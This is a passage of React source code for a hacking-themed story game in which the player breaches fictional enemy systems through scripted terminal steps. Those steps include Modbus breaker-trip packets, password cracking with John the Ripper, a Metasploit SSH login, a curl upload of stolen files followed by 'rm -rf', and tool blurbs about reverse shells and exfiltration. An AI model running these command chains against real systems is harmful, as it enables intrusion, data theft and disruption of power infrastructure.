          { t: "dim", v: "Crafting Modbus Write Single Register packet:" },
          { t: "sys", v: "  Transaction ID: 0x0001  Protocol: 0x0000" },
          { t: "sys", v: "  Function Code: 0x06  Register: 0x0200  Value: 0x0000 (TRIP)" },
          { t: "dim", v: "" },
          { t: "ok", v: "Sending to 10.99.5.11 (Military ALPHA)... Done" },
          { t: "ok", v: "Sending to 10.99.5.12 (Military BRAVO)... Done" },
          { t: "ok", v: "Sending to 10.99.5.13 (Military CHARLIE)... Done" },
          { t: "warn", v: "Skipping 10.99.5.20 — CIVILIAN NODE — suppressed" },
          { t: "warn", v: "Skipping 10.99.5.21 — CIVILIAN NODE — suppressed" },
          { t: "ok", v: "[PACKETS SENT] Breaker registers set to TRIP on all military nodes" },
        ]
      },
      {
        tool: "sudo", label: "VERIFY — Confirm military blackout and civilian grid safety",
        hint: "sudo bash blackout_verify.sh --check-civilian-online --arm-confirmation",
        accept: ["sudo", "bash", "blackout", "confirm"],
        response: [
          { t: "cmd", v: "$ sudo bash blackout_verify.sh --check-civilian-online --arm-confirmation" },
          { t: "dim", v: "Running post-strike verification protocol..." },
          { t: "dim", v: "" },
          { t: "ok", v: "[SAFE] 10.99.5.20 Civilian Grid Node — ONLINE ✓" },
          { t: "ok", v: "[SAFE] 10.99.5.21 Civilian Grid Node — ONLINE ✓" },
          { t: "dim", v: "" },
          { t: "ok", v: "[OFFLINE] Military Base ALPHA  — DARK  (0 MW draw detected)" },
          { t: "ok", v: "[OFFLINE] Military Base BRAVO  — DARK  (0 MW draw detected)" },
          { t: "ok", v: "[OFFLINE] Military Base CHARLIE — DARK  (0 MW draw detected)" },
          { t: "dim", v: "" },
          { t: "sys", v: "SIGINT: Kovalon generals reporting total loss of forward base power" },
          { t: "ok", v: "Invasion timeline: COLLAPSED — minimum 72-hour delay" },
          { t: "ok", v: "[MISSION COMPLETE] DARK HARVEST — MILITARY GRID: OFFLINE ██" },
        ]
      }
    ]
  },

  command: {
    toolsUsed: ["nmap", "john", "metasploit", "openssl", "curl"],
    intro: [
      { t: "accent", v: "SPECTER-7 Terminal v4.1 // KAIROS-COMMAND Interface" },
      { t: "sys", v: "Target: Kovalon Strategic Command HQ — FINAL NODE" },
      { t: "sys", v: "IP: 10.0.0.1  |  Classification: ULTRA SECRET" },
      { t: "dim", v: "────────────────────────────────────────" },
      { t: "warn", v: "[OBJECTIVE] Breach COMMAND. Extract war crimes evidence. Void invasion order." },
      { t: "err", v: "[ALERT] SENTINEL v3 counter-AI is live. Trace in progress. Move FAST." },
      { t: "dim", v: "" },
    ],
    steps: [
      {
        tool: "nmap", label: "DEEP SCAN — Full OS fingerprint and script scan on Command HQ",
        hint: "nmap -sV -O --script=ssh-hostkey,http-auth-finder -p 22,443,8443,4433 10.0.0.1",
        accept: ["nmap"],
        response: [
          { t: "cmd", v: "$ nmap -sV -O --script=ssh-hostkey,http-auth-finder -p 22,443,8443,4433 10.0.0.1" },
          { t: "dim", v: "Nmap deep scan — OS detect + NSE scripts active" },
          { t: "ok", v: "22/tcp    open  ssh    OpenSSH 9.0  (RSA-4096)" },
          { t: "ok", v: "443/tcp   open  https  KAIROS-COMMAND Portal v4" },
          { t: "ok", v: "8443/tcp  open  https  Admin API (JWT Bearer Auth)" },
          { t: "ok", v: "4433/tcp  open  tls    Evidence Archive Server" },
          { t: "dim", v: "" },
          { t: "sys", v: "OS: Linux 5.15 (Kovalon Custom Hardened Kernel)" },
          { t: "sys", v: "ssh-hostkey RSA 4096: 3a:f2:44:bb:9c:1e:..." },
          { t: "err", v: "[SENTINEL] Intrusion detection alert raised — 4 minutes before trace" },
        ]
      },
      {
        tool: "john", label: "HASH CRACK — Break KAIROS shadow file with John the Ripper",
        hint: "john --wordlist=/opt/rockyou.txt --rules=KoreLogic kairos_shadow.txt",
        accept: ["john", "hashcat"],
        response: [
          { t: "cmd", v: "$ john --wordlist=/opt/rockyou.txt --rules=KoreLogic kairos_shadow.txt" },
          { t: "dim", v: "John the Ripper 1.9.0-jumbo-1 — cracking SHA-512 hashes" },
          { t: "dim", v: "Loaded 6 password hashes with salts (sha512crypt)" },
          { t: "dim", v: "" },
          { t: "ok", v: "[1/6] root           : C0mm4nd@K4IR0S       (20s)" },
          { t: "ok", v: "[2/6] gen.volkov      : Ir0nVal3_2029        (44s)" },
          { t: "ok", v: "[3/6] sys.ops         : s3cur1ty_hub!        (1m12s)" },
          { t: "warn", v: "[4-6] No result — hashes too complex for current wordlist" },
          { t: "dim", v: "" },
          { t: "ok", v: "3 of 6 cracked. KEY: gen.volkov / Ir0nVal3_2029" },
          { t: "ok", v: "General Volkov's credentials acquired" },
        ]
      },
      {
        tool: "metasploit", label: "SSH SHELL — Use Metasploit to log into Command HQ as Volkov",
        hint: "msfconsole -q -x 'use auxiliary/scanner/ssh/ssh_login; set RHOSTS 10.0.0.1; set USERNAME gen.volkov; set PASSWORD Ir0nVal3_2029; run'",
        accept: ["msfconsole", "msf", "ssh", "metasploit"],
        response: [
          { t: "cmd", v: "$ msfconsole -q -x 'use auxiliary/scanner/ssh/ssh_login; set RHOSTS 10.0.0.1; ...'" },
          { t: "accent", v: "       =[ metasploit v6.3.44 ]=" },
          { t: "dim", v: "" },
          { t: "sys", v: "msf6 auxiliary(scanner/ssh/ssh_login) > run" },
          { t: "dim", v: "[*] 10.0.0.1:22 — Starting login attempt gen.volkov:Ir0nVal3_2029" },
          { t: "ok", v: "[+] 10.0.0.1:22 — Success: 'gen.volkov:Ir0nVal3_2029' uid=0(root)" },
          { t: "ok", v: "[*] Command shell session 1 opened (10.0.5.1 → 10.0.0.1:22)" },
          { t: "dim", v: "" },
          { t: "sys", v: "gen.volkov@KAIROS-CMD:~$ ls /classified/" },
          { t: "ok", v: "invasion_order_final.pdf  war_crimes_docs/  launch_codes.enc" },
          { t: "ok", v: "[ROOT SHELL] KAIROS-COMMAND HQ compromised" },
        ]
      },
      {
        tool: "openssl", label: "DECRYPT — Unlock AES-256 encrypted invasion order file",
        hint: "openssl enc -d -aes-256-cbc -in launch_codes.enc -out launch_codes.txt -k Ir0nVal3_2029",
        accept: ["openssl", "gpg"],
        response: [
          { t: "cmd", v: "$ openssl enc -d -aes-256-cbc -in launch_codes.enc -out launch_codes.txt -k Ir0nVal3_2029" },
          { t: "dim", v: "OpenSSL 3.2.0 — AES-256-CBC decryption" },
          { t: "dim", v: "Decrypting launch_codes.enc..." },
          { t: "dim", v: "" },
          { t: "warn", v: "[DECRYPTED] OPERATION IRON VALE — FINAL INVASION ORDER" },
          { t: "sys", v: "Authorization: GENERAL VOLKOV + MARSHAL DRENOV" },
          { t: "sys", v: "H-Hour: 0300 LOCAL  |  D-Day: 72 HOURS" },
          { t: "sys", v: "Targets: [7 allied nations — CLASSIFIED]" },
          { t: "dim", v: "" },
          { t: "ok", v: "[EVIDENCE] Full invasion plan + war crimes files extracted" },
          { t: "ok", v: "[PACKAGE] 4.2GB — ready for ICC transmission" },
        ]
      },
      {
        tool: "curl", label: "TRANSMIT + DESTROY — Upload evidence to ICC & wipe KAIROS-COMMAND",
        hint: "curl -X POST https://icc-secure.int/upload -F evidence=@war_crimes.tar.gz && sudo rm -rf /classified/ && sudo shutdown -h now 10.0.0.1",
        accept: ["curl", "wget", "sudo"],
        response: [
          { t: "cmd", v: "$ curl -X POST https://icc-secure.int/upload -F evidence=@war_crimes.tar.gz" },
          { t: "dim", v: "Uploading to International Criminal Court secure server..." },
          { t: "sys", v: "████████████████████████████████ 100%  4.2GB uploaded" },
          { t: "ok", v: "HTTP/2 200 — Evidence package received and hash-verified" },
          { t: "dim", v: "" },
          { t: "cmd", v: "$ sudo rm -rf /classified/ && sudo shutdown -h now" },
          { t: "dim", v: "Destroying all KAIROS war plans and launch codes..." },
          { t: "warn", v: "Kovalon Defense Intranet: 'KAIROS-COMMAND offline. Invasion order NULL.'" },
          { t: "dim", v: "" },
          { t: "ok", v: "[ICC] Case #2031-KVL filed. International arrest warrants issued." },
          { t: "ok", v: "[ALLIED] Threat level: RESOLVED. Ground forces standing down." },
          { t: "dim", v: "" },
          { t: "accent", v: "████████████████████████████████████████████████" },
          { t: "accent", v: "  OPERATION CIPHER STRIKE — COMPLETE" },
          { t: "accent", v: "  ALL NODES BREACHED. INVASION VOIDED. VICTORY." },
          { t: "accent", v: "████████████████████████████████████████████████" },
        ]
      }
    ]
  }
};

const STORY_CHAPTERS = [
  {
    id: "prologue", chapter: "PROLOGUE", title: "The Iron Curtain Protocol",
    para: [
      "The year is 2031. The Kovalon Federation — a rogue coalition of military-industrial states — has begun Operation IRON VALE: a systematic digital assault on neighboring democracies before sending in ground troops.",
      "Three allied nations are already crippled. Financial systems frozen. Power blackouts. Communications severed.",
      "You are SPECTER-7. Last operative of a covert cyber-defense unit. Your mission: destroy Kovalon's digital leverage across five critical KAIROS nodes before their invasion clock hits zero.",
      "You have real tools. Real terminals. 72 hours."
    ],
    choices: [
      { text: "Accept — Begin Operation CIPHER STRIKE", next: "game" },
      { text: "Review tool briefing first", next: "intel" }
    ]
  },
  {
    id: "intel", chapter: "TOOL BRIEFING", title: "Your Cyber Arsenal",
    para: [
      "Every mission uses a chain of real offensive security tools. You'll type commands into a live terminal — or use the autofill hint system.",
    ],
    choices: [{ text: "Understood. Deploy now.", next: "game" }]
  }
];

const MISSIONS = [
  { id: "radar", name: "BLIND EAGLE", target: "Air Defense Radar", icon: "📡", diff: 1, xp: 150, unlocks: "economy", storyAfter: "SKYWATCHER is tracking 400 phantom aircraft. Real allied planes invisible. Air defense: blind." },
  { id: "economy", name: "FROZEN ASSETS", target: "Financial Warfare System", icon: "💹", diff: 2, xp: 250, unlocks: "comms", storyAfter: "$4.7B in Kovalon war funds frozen. Allied central banks recovering. Economic leverage: gone." },
  { id: "comms", name: "STATIC VOICE", target: "State Propaganda Network", icon: "📻", diff: 2, xp: 300, unlocks: "grid", storyAfter: "14M Kovalon citizens watched war crimes evidence on state TV. Protests in three cities." },
  { id: "grid", name: "DARK HARVEST", target: "Military Power Grid (ICS)", icon: "⚡", diff: 3, xp: 400, unlocks: "command", storyAfter: "Military forward bases dark. Civilian grid untouched. Invasion timeline: collapsed." },
  { id: "command", name: "DECAPITATION", target: "Strategic Command HQ", icon: "🎯", diff: 4, xp: 600, unlocks: null, storyAfter: "KAIROS-COMMAND destroyed. Evidence at ICC. Invasion order voided. General Volkov arrested." },
];

function PBar({ label, value, max, color = "cyan" }) {
  const pct = Math.min(100, Math.round((value / max) * 100));
  return (
    <div className="progress-wrap">
      <div className="progress-label"><span>{label}</span><span>{pct}%</span></div>
      <div className="progress-track"><div className={`progress-fill pf-${color}`} style={{ width: `${pct}%` }} /></div>
    </div>
  );
}

function TerminalHack({ mission, onSuccess, onFail }) {
  const mdata = TERMINAL_MISSIONS[mission.id];
  const [step, setStep] = useState(0);
  const [lines, setLines] = useState(() => mdata.intro.map(l => ({ t: l.t, v: l.v })));
  const [input, setInput] = useState("");
  const [typing, setTyping] = useState(false);
  const [done, setDone] = useState(false);
  const endRef = useRef();
  const inputRef = useRef();

  useEffect(() => { endRef.current?.scrollIntoView({ behavior: "smooth" }); }, [lines]);

  const curStep = mdata.steps[step];

  function animateLines(newLines, cb) {
    setTyping(true);
    let i = 0;
    const tick = () => {
      if (i >= newLines.length) { setTyping(false); cb?.(); return; }
      setLines(l => [...l, newLines[i]]);
      i++;
      setTimeout(tick, 50 + Math.random() * 30);
    };
    tick();
  }

  function submit(raw) {
    if (typing || done) return;
    if (!raw) return;
    const low = raw.toLowerCase();
    const accepted = curStep.accept.some(a => low.startsWith(a.toLowerCase()));
    setLines(l => [...l, { t: "cmd", v: `specter7@kovalon-${mission.id}:~$ ${raw}` }]);
    setInput("");

    if (accepted) {
      animateLines(curStep.response, () => {
        if (step + 1 >= mdata.steps.length) {
          setDone(true);
          setTimeout(onSuccess, 1000);
        } else {
          const nxt = mdata.steps[step + 1];
          setTimeout(() => {
            setLines(l => [...l,
            { t: "dim", v: "" },
            { t: "warn", v: `[NEXT] ${nxt.label}` },
            { t: "accent", v: `[TOOL] ${nxt.tool.toUpperCase()}` },
            ]);
            setStep(s => s + 1);
            inputRef.current?.focus();
          }, 200);
        }
      });
    } else {
      setDone(true);
      animateLines([
        { t: "err", v: `bash: '${raw.split(" ")[0]}': invalid or dangerous command` },
        { t: "err", v: `[ALERT] Unauthorized action detected by SENTINEL AI` },
        { t: "err", v: `[CRITICAL] Network trace initiated. Operations locked.` },
      ], () => {
        setTimeout(onFail, 1500);
      });
    }
  }

  function autofill() {
    if (typing || done) return;
    submit(curStep.hint);
  }

  // Generate some plausible fake commands alongside the real one for selection
  const options = (() => {
    if (!curStep) return [];
    const correct = curStep.hint;
    const fakes = [
      `ping -c 4 ${curStep.hint.split(" ").slice(-1)[0] || "10.0.0.1"}`,
      `cat /var/log/syslog | grep ${curStep.tool}`,
      `${curStep.tool} --help`,
      `ssh root@${curStep.hint.split(" ").slice(-1)[0] || "localhost"}`
    ].filter(f => f !== correct).sort(() => 0.5 - Math.random()).slice(0, 2);

    return [correct, ...fakes].sort(() => 0.5 - Math.random());
  })();

  const tClass = { cmd: "t-cmd", ok: "t-ok", err: "t-err", warn: "t-warn", dim: "t-dim", accent: "t-accent", sys: "t-sys" };

  return (
    <div className="hack-panel">
      <div className="hack-title">{mission.name} — {mission.target}</div>
      <div className="hack-sub">Terminal Exploitation Chain — Type real hacking commands</div>

      <div className="step-track">
        {mdata.steps.map((_, i) => (
          <div key={i} className={`step-dot ${i < step ? "done" : i === step ? "active" : ""}`} title={mdata.steps[i].label} />
        ))}
      </div>

      <div className="tool-chips">
        <span style={{ fontSize: ".58rem", color: "var(--dim)", alignSelf: "center", letterSpacing: ".2em", marginRight: 4 }}>ARSENAL:</span>
        {mdata.toolsUsed.map((t, i) => (
          <span key={i} className={`tool-chip ${i < step ? "used" : ""}`}>{t}</span>
        ))}
      </div>

      {!done && (
        <div className="cmd-hint">
          <div className="cmd-hint-label">STEP {step + 1}/{mdata.steps.length} — {curStep.label}</div>
          <div style={{ fontSize: ".62rem", color: "var(--accent)", marginTop: 3 }}>
            TOOL: <span style={{ color: "var(--accent4)" }}>{curStep.tool.toUpperCase()}</span>
            &emsp;
            <span style={{ color: "var(--accent3)", cursor: "pointer", borderBottom: "1px dashed var(--accent3)" }}
              onClick={autofill}>⚡ TAP TO AUTOFILL</span>
          </div>
        </div>
      )}

      <div className="terminal-wrap">
        <div className="terminal-out">
          {lines.map((l, i) => (
            <div key={i} className={`t-line ${l && l.t ? tClass[l.t] : ""}`}>{l ? l.v : ""}</div>
          ))}
          {typing && <div className="t-line t-dim">▌</div>}
          <div ref={endRef} />
        </div>
        <div className="term-input-row" style={{ flexDirection: "column", alignItems: "stretch", gap: 6, margin: "10px 0" }}>
          <div className="term-prompt" style={{ marginBottom: 4 }}>specter7@kovalon-{mission.id}:~$ <span className="t-dim">(SELECT COMMAND)</span></div>
          {!typing && !done && options.map((opt, i) => (
            <button key={i} className="btn-secondary" style={{
              textAlign: "left", fontSize: ".65rem", padding: "10px 14px",
              fontFamily: "Share Tech Mono, monospace", background: "rgba(0,15,30,0.6)",
              border: "1px solid var(--accent)", color: "var(--text)"
            }} onClick={() => submit(opt)}>
              &gt; {opt}
            </button>
          ))}
        </div>
      </div>

      <div style={{ marginTop: 10, display: "flex", gap: 10, flexShrink: 0 }}>
        <button className="btn-secondary" style={{ fontSize: ".65rem", padding: "8px 14px" }} onClick={onFail} disabled={typing}>ABORT</button>
      </div>
    </div>
  );
}

export default function CipherStrike() {
  const [screen, setScreen] = useState("boot");
  const [storyIdx, setStoryIdx] = useState(0);
  const [nav, setNav] = useState("map");
  const [completed, setCompleted] = useState([]);
  const [unlocked, setUnlocked] = useState(["radar"]);
  const [activeMission, setActiveMission] = useState(null);
  const [hacking, setHacking] = useState(false);
  const [xp, setXp] = useState(0);
  const [threat, setThreat] = useState(3);
  const [alertMsg, setAlertMsg] = useState(null);
  const [modal, setModal] = useState(null);
  const alertRef = useRef();

  function flash(msg) {
    setAlertMsg(msg);
    clearTimeout(alertRef.current);
    alertRef.current = setTimeout(() => setAlertMsg(null), 3200);
  }

  function startMission(m) {
    if (!unlocked.includes(m.id)) { flash("⚠ LOCKED — Complete previous mission first"); return; }
    if (completed.includes(m.id)) { flash("Mission already completed"); return; }
    setActiveMission(m);
    setHacking(true);
    setNav("hack");
  }

  function onSuccess() {
    setHacking(false);
    const m = activeMission;
    setCompleted(c => [...c, m.id]);
    setXp(x => x + m.xp);
    setThreat(t => Math.max(0, t - 1));
    if (m.unlocks) setUnlocked(u => [...u, m.unlocks]);
    setModal({
      title: "✓ HACK SUCCESSFUL", accent: "var(--accent3)",
      body: m.storyAfter,
      onClose: () => {
        setModal(null); setNav("map");
        if (m.id === "command") setTimeout(() => setScreen("complete"), 600);
      }
    });
  }

  function onFail() {
    setHacking(false);
    setThreat(t => Math.min(10, t + 2));
    flash("⚠ MISSION ABORTED — Threat level increased");
    setNav("map");
  }

  const chapter = STORY_CHAPTERS[storyIdx];
  const totalXP = MISSIONS.reduce((a, m) => a + m.xp, 0);
  const curMission = MISSIONS.find(m => m.id === activeMission?.id);
  const invHrs = Math.max(0, 72 - completed.length * 14);

  if (screen === "boot") return (
    <div style={{ fontFamily: "Share Tech Mono" }}><style>{CSS}</style><div className="scanlines" />
      <div className="screen"><div className="boot-bg" /><div className="boot-grid" />
        <div className="corner corner-tl" /><div className="corner corner-tr" />
        <div className="corner corner-bl" /><div className="corner corner-br" />
        <div className="hud-line hud-tl">SYS: CIPHER_STRIKE_v4.2</div>
        <div className="hud-line hud-tr">OPERATIVE: SPECTER-7</div>
        <div className="hud-line hud-bl">LOC: ██████ [CLASSIFIED]</div>
        <div className="hud-line hud-br">ENCRYPT: AES-512</div>
        <div style={{ position: "relative", zIndex: 2, textAlign: "center" }}>
          <div className="logo-title">CIPHER STRIKE</div>
          <div className="logo-sub">Digital Warfare · Covert Cyber Operations</div>
          <button className="boot-btn" onClick={() => setScreen("story")}>▶ INITIALIZE MISSION</button>
        </div>
      </div>
    </div>
  );

  if (screen === "story") return (
    <div style={{ fontFamily: "Share Tech Mono" }}><style>{CSS}</style><div className="scanlines" />
      <div className="screen" style={{ flexDirection: "column", alignItems: "stretch", justifyContent: "flex-start" }}>
        <div className="brief-header">
          <div className="brief-title">CIPHER STRIKE // SECURE CHANNEL</div>
          <div style={{ fontSize: ".6rem", color: "var(--dim)", letterSpacing: ".2em" }}>ENCRYPTION: ACTIVE</div>
        </div>
        <div className="brief-body">
          <div className="brief-mission-tag">{chapter.chapter}</div>
          <div className="brief-heading">{chapter.title}</div>
          {chapter.para.map((p, i) => <div key={i} className="brief-text">{p}</div>)}

          {chapter.id === "prologue" && (
            <>
              <div style={{ marginTop: 16, marginBottom: 6, fontSize: ".6rem", letterSpacing: ".4em", color: "var(--accent4)" }}>TOOLS YOU WILL USE IN THIS OPERATION</div>
              <div style={{ display: "grid", gridTemplateColumns: "repeat(auto-fill,minmax(340px,1fr))", gap: 6, marginBottom: 16 }}>
                {[
                  ["nmap", "Network scanner — discover open ports, services, vulnerabilities"],
                  ["wireshark / tshark", "Packet capture & analysis — intercept live network traffic"],
                  ["aircrack-ng", "WPA2 cracker — break wireless authentication keys from captures"],
                  ["sqlmap", "SQL injection tool — exploit and dump vulnerable databases"],
                  ["metasploit / msfconsole", "Exploit framework — deploy reverse shells and gain remote access"],
                  ["hydra", "Login brute-forcer — crack HTTP, SSH, FTP credentials"],
                  ["john the ripper", "Password hash cracker — break shadow files and hashed passwords"],
                  ["scapy", "Raw packet forge — craft and inject malicious network packets"],
                  ["openssl", "Cryptography toolkit — decrypt AES/RSA-encrypted enemy files"],
                  ["netcat / curl / ffmpeg", "Network data transfer — stream payloads and exfiltrate data"],
                  ["sudo", "Privilege escalation — execute commands with root access"],
                ].map(([t, d], i) => (
                  <div key={i} className="obj-item">
                    <span className="obj-icon">▸</span>
                    <span><span style={{ color: "var(--accent4)" }}>{t}</span>&nbsp;<span style={{ color: "var(--dim)" }}>— {d}</span></span>
                  </div>
                ))}
              </div>
              <div className="threat-bar">
                <div className="threat-label">KOVALON INVASION THREAT — CRITICAL (72H CLOCK ACTIVE)</div>
                <div style={{ display: "flex", gap: 4 }}>
                  {Array.from({ length: 10 }).map((_, i) => <div key={i} className={`threat-seg ${i < 8 ? "active" : "inactive"}`} />)}
                </div>
              </div>
            </>
          )}

          {chapter.id === "intel" && (
            <div style={{ marginTop: 8 }}>
              {[
                ["nmap", "First tool in every mission. Scan the target for open ports and known vulnerabilities."],
                ["wireshark", "Capture live traffic to find auth tokens, credentials, and control signals."],
                ["aircrack-ng", "Crack WiFi/WPA2 keys extracted from packet captures."],
                ["sqlmap", "Automate SQL injection attacks against exposed database APIs."],
                ["metasploit", "Deploy and manage exploit payloads — great for getting shells."],
                ["hydra", "Brute-force logins when you have a target URL and a wordlist."],
                ["john", "Crack hashed passwords once you've stolen a shadow or passwd file."],
                ["scapy", "Forge raw network packets — essential for ICS/SCADA attacks."],
                ["openssl", "Decrypt AES/RSA-encrypted files once you have the key."],
                ["curl / ffmpeg", "Exfiltrate data, stream payloads, or upload to external servers."],
              ].map(([t, d], i) => (
                <div key={i} className="obj-item">
                  <span className="obj-icon">▸</span>
                  <span><span style={{ color: "var(--accent4)" }}>{t}</span>&nbsp;<span style={{ color: "var(--dim)" }}>— {d}</span></span>
                </div>
              ))}
            </div>
          )}

          <div style={{ display: "flex", gap: 12, marginTop: 24, flexWrap: "wrap" }}>
            {chapter.choices.map((c, i) => (
              <button key={i} className={i === 0 ? "btn-primary" : "btn-secondary"}
                onClick={() => { if (c.next === "game") setScreen("game"); else setStoryIdx(1); }}>
                {c.text}
              </button>
            ))}
          </div>
        </div>
      </div>
    </div>
  );

  if (screen === "complete") return (
    <div style={{ fontFamily: "Share Tech Mono" }}><style>{CSS}</style><div className="scanlines" />
      <div className="screen" style={{ background: "#010911" }}>
        <div className="boot-bg" /><div className="boot-grid" />
        <div className="corner corner-tl" /><div className="corner corner-tr" />
        <div className="corner corner-bl" /><div className="corner corner-br" />
        <div style={{ position: "relative", zIndex: 2, textAlign: "center", padding: "0 20px" }}>
          <div className="complete-title">MISSION ACCOMPLISHED</div>
          <div style={{ fontFamily: "Rajdhani", fontSize: "1rem", color: "var(--dim)", letterSpacing: ".4em", marginTop: 8 }}>OPERATION CIPHER STRIKE — DECISIVE VICTORY</div>
          <div style={{ display: "flex", gap: 24, margin: "32px 0", flexWrap: "wrap", justifyContent: "center" }}>
            <div className="score-card"><span className="score-val">{xp}</span><span className="score-lbl">XP EARNED</span></div>
            <div className="score-card"><span className="score-val">5/5</span><span className="score-lbl">NODES BREACHED</span></div>
            <div className="score-card"><span className="score-val">{Math.max(0, 10 - threat)}/10</span><span className="score-lbl">STEALTH RATING</span></div>
          </div>
          <div style={{ fontFamily: "Rajdhani", fontSize: "1rem", color: "var(--text)", maxWidth: 500, margin: "0 auto 28px", lineHeight: 1.7 }}>
            The Kovalon Federation has been stopped cold. Evidence at the ICC. General Volkov arrested. Millions of lives saved by one operative behind a terminal.
          </div>
          <button className="btn-primary" onClick={() => {
            setScreen("boot"); setCompleted([]); setUnlocked(["radar"]);
            setXp(0); setThreat(3); setActiveMission(null); setHacking(false); setNav("map");
          }}>▶ NEW GAME</button>
        </div>
      </div>
    </div>
  );

  return (
    <div style={{ fontFamily: "Share Tech Mono", width: "100vw", height: "100vh", overflow: "hidden" }}>
      <style>{CSS}</style>
      <div className="scanlines" />

      {alertMsg && <div className="alert-bar">{alertMsg}</div>}

      {modal && (
        <div className="modal-overlay">
          <div className="modal">
            <div className="corner corner-tl" style={{ width: 16, height: 16 }} />
            <div className="corner corner-br" style={{ width: 16, height: 16 }} />
            <div className="modal-title" style={{ color: modal.accent || "var(--accent)" }}>{modal.title}</div>
            <div className="modal-body">{modal.body}</div>
            <button className="btn-primary" style={{ background: modal.accent || "var(--accent)" }} onClick={modal.onClose}>CONTINUE ▶</button>
          </div>
        </div>
      )}

      <div className="game-screen">
        <div className="game-topbar">
          <div className="game-logo">◈ CIPHER STRIKE // SPECTER-7</div>
          <div className="stat-row">
            <div className="stat"><span className="stat-label">XP</span><span className="stat-val">{xp}</span></div>
            <div className="stat"><span className="stat-label">NODES</span><span className="stat-val">{completed.length}/5</span></div>
            <div className="stat"><span className="stat-label">THREAT</span><span className={`stat-val ${threat >= 7 ? "danger" : ""}`}>{threat}/10</span></div>
            <div className="stat"><span className="stat-label">T-MINUS</span><span className={`stat-val ${invHrs < 24 ? "danger" : ""}`}>{String(invHrs).padStart(2, "0")}:00</span></div>
          </div>
        </div>

        <div className="game-body">
          <nav className="side-nav">
            <div className="nav-section-label">OPERATIONS</div>
            {[
              { id: "map", icon: "🗺", label: "Missions" },
              { id: "hack", icon: "⚡", label: "Terminal", badge: hacking ? "LIVE" : null },
              { id: "intel", icon: "📋", label: "Intel" },
            ].map(n => (
              <div key={n.id} className={`nav-item ${nav === n.id ? "active" : ""} ${n.id === "hack" && !hacking ? "locked" : ""}`}
                onClick={() => { if (n.id === "hack" && !hacking) { flash("No active hack — select a mission"); return; } setNav(n.id); }}>
                <span className="nav-icon">{n.icon}</span><span>{n.label}</span>
                {n.badge && <span className="nav-badge">{n.badge}</span>}
              </div>
            ))}
            <div className="nav-section-label" style={{ marginTop: 12 }}>BASE</div>
            {[
              { id: "tools", icon: "🛠", label: "Arsenal" },
              { id: "debrief", icon: "📖", label: "Debrief" },
            ].map(n => (
              <div key={n.id} className={`nav-item ${nav === n.id ? "active" : ""}`} onClick={() => setNav(n.id)}>
                <span className="nav-icon">{n.icon}</span><span>{n.label}</span>
              </div>
            ))}
          </nav>

          <div className="main-panel">
            {/* MISSION MAP */}
            {nav === "map" && (
              <div style={{ flex: 1, overflowY: "auto", padding: 16, background: "#010911" }}>
                <div style={{ marginBottom: 14 }}>
                  <div style={{ fontSize: ".6rem", letterSpacing: ".4em", color: "var(--dim)", marginBottom: 8 }}>KOVALON KAIROS NODES — SELECT TARGET TO BEGIN HACK</div>
                  <PBar label="OPERATION PROGRESS" value={completed.length} max={5} color="cyan" />
                  <PBar label="THREAT EXPOSURE" value={threat} max={10} color="red" />
                </div>
                <div style={{ display: "grid", gridTemplateColumns: "repeat(auto-fill,minmax(270px,1fr))", gap: 10 }}>
                  {MISSIONS.map(m => {
                    const isDone = completed.includes(m.id);
                    const isLock = !unlocked.includes(m.id);
                    const isAct = activeMission?.id === m.id && hacking;
                    const md = TERMINAL_MISSIONS[m.id];
                    return (
                      <div key={m.id} className={`map-card ${isDone ? "done" : ""} ${isAct ? "active-hack" : ""} ${isLock ? "locked" : ""}`}
                        onClick={() => startMission(m)}>
                        <div style={{ display: "flex", alignItems: "center", gap: 10, marginBottom: 8 }}>
                          <span style={{ fontSize: "1.4rem" }}>{m.icon}</span>
                          <div style={{ flex: 1 }}>
                            <div style={{ fontFamily: "Orbitron", fontSize: ".7rem", color: isDone ? "var(--accent3)" : isLock ? "var(--dim)" : "#fff", letterSpacing: ".12em" }}>{m.name}</div>
                            <div style={{ fontSize: ".58rem", color: "var(--dim)", marginTop: 2 }}>{m.target}</div>
                          </div>
                          <div style={{ fontSize: ".58rem", color: isDone ? "var(--accent3)" : isLock ? "var(--dim)" : "var(--accent4)" }}>
                            {isDone ? "✓ DONE" : isLock ? "🔒 LOCKED" : isAct ? "◉ ACTIVE" : "▶ READY"}
                          </div>
                        </div>
                        <div style={{ display: "flex", gap: 4, flexWrap: "wrap", marginBottom: 8 }}>
                          {md.toolsUsed.map((t, i) => (
                            <span key={i} style={{ fontSize: ".52rem", color: "var(--accent4)", border: "1px solid #2a3a10", background: "#0a1200", padding: "2px 5px" }}>{t}</span>
                          ))}
                        </div>
                        <div style={{ display: "flex", justifyContent: "space-between", fontSize: ".58rem", color: "var(--dim)" }}>
                          <span>DIFF: <span style={{ color: ["", "var(--accent3)", "var(--accent3)", "var(--accent4)", "var(--accent2)"][m.diff] }}>{"▮".repeat(m.diff)}{"▯".repeat(4 - m.diff)}</span></span>
                          <span style={{ color: "var(--accent4)" }}>+{m.xp} XP</span>
                          <span>{md.steps.length} STEPS</span>
                        </div>
                      </div>
                    );
                  })}
                </div>
              </div>
            )}

            {/* TERMINAL */}
            {nav === "hack" && hacking && curMission && (
              <TerminalHack mission={curMission} onSuccess={onSuccess} onFail={onFail} />
            )}

            {/* INTEL */}
            {nav === "intel" && (
              <div className="story-panel">
                <div className="story-chapter">SIGINT // LIVE FEED</div>
                <div className="story-title">Intercepted Intelligence</div>
                {[
                  { d: "", v: "SIGINT: KAIROS uptime 94% — all nodes active. Invasion clock running." },
                  { d: "", v: "INTERCEPT: General Volkov on KAIROS-COMMAND. Digital signature confirmed." },
                  { d: "yellow", v: "SENTINEL v3 AI updated — analyzing intrusion patterns. Move fast." },
                  { d: "green", v: "Allied NATO cyber teams: radar disruption holding. Air corridors open." },
                  { d: "green", v: "HUMINT source: Kovalon generals arguing about failed invasion timeline." },
                  { d: "", v: "OSINT: KVL Media admin uses predictable credentials — noted for COMMS op." },
                  { d: "yellow", v: "ICS: Grid SCADA uses Modbus TCP. PLCs: Siemens S7-1500. Unpatched." },
                  { d: "green", v: "ICC secure server: operational. Ready to receive evidence package." },
                ].map((item, i) => (
                  <div key={i} className="intel-item" style={{ marginBottom: 12, fontFamily: "Rajdhani", fontSize: ".9rem", lineHeight: 1.6 }}>
                    <div className={`intel-dot ${item.d}`} style={{ marginTop: 5, flexShrink: 0 }} />
                    <div>{item.v}</div>
                  </div>
                ))}
              </div>
            )}

            {/* ARSENAL */}
            {nav === "tools" && (
              <div className="hack-panel">
                <div className="hack-title">CYBER ARSENAL</div>
